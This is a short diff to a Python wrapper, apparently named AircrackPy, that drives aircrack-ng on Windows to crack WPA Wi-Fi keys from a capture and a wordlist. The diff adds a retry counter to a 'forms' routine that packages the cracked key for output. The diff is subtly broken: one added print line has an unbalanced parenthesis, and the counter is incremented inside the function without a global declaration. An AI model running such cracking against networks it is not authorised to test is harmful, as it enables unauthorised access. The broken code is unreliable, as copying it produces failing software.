@@ -36,10 +36,11 @@ def resolver_ruta(ruta_relativa):
 
 with open(resolver_ruta("LICENSE"),"r") as f:
     print(f.read())
-
+intentos=0
 def forms(key,pcap,dic):
  while True:
   try:
+    intentos+=1
     dic=dic.split("\\")[-1]
     pcap=pcap.split("\\")[-1]
     data='####\nClave encontrada: '+str(key)+'\nCaptura: '+pcap+'\nDiccionario: '+dic+'\n\n## Coded by 4nth0nySLT ##\nTelegram: t.me/Anth0nySLT\nhttps://github.com/4nth0nySLT'
@@ -52,6 +53,8 @@ def forms(key,pcap,dic):
   except Exception as e:
       print("UPSS ocurrio un error\n"+str(e)+"\nReintentando...")
       sleep(15)
+      if intentos==3:
+       break
       pass
 
 class AircrackPy():
@@ -93,10 +96,8 @@ class AircrackPy():
                    print("Clave wpa:"+str(key))
                    if key!='':
                        os.system("TASKKILL /F /IM aircrack-ng.exe")
+                       print("Clave wpa:"+str(key)+"                                           "))
                        forms(key,pcap,dic)
-                   sleep(2.5)
-                   os.system("cls")
-                   print("Clave wpa:"+str(key))
                remove(self.file)
                break
            elif proc.poll()!=None:
